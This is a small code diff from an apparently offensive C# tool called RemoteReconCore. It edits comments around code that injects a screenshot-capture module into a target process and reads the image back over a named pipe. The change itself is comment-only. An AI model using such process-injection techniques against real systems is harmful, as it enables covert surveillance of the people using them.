@@ -18,7 +18,7 @@ namespace RemoteReconCore
         public KeyValuePair<int, string>Run()
         {
             string image = "";
-            //Inject the recon module into the target process.
+            //Inject the recon module for screenshot into the target process.
             byte[] screenshotMod = Agent.PatchRemoteReconNative("screenshot");
             Injector screenshot = new Injector(targetPid, screenshotMod);
 
@@ -35,6 +35,7 @@ namespace RemoteReconCore
 
                 try
                 {
+                    //Connect to the named pipe server and read the screen shot image.
                     NamedPipeClientStream client = new NamedPipeClientStream(".", "svc_ss", PipeDirection.InOut);
 
                     client.Connect((1000 * Agent.sleep));
